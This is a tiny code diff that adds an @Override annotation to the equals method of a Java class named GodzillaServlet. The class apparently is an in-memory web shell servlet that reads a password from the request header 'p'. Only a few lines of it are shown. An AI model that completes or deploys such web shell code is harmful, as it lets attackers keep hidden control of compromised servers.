@@ -114,6 +114,7 @@ public class GodzillaServlet extends ClassLoader implements Servlet {
         return value;
     }
 
+    @Override
     public boolean equals(Object obj) {
         this.parseObj(obj);
         this.Pwd = this.request.getHeader("p");
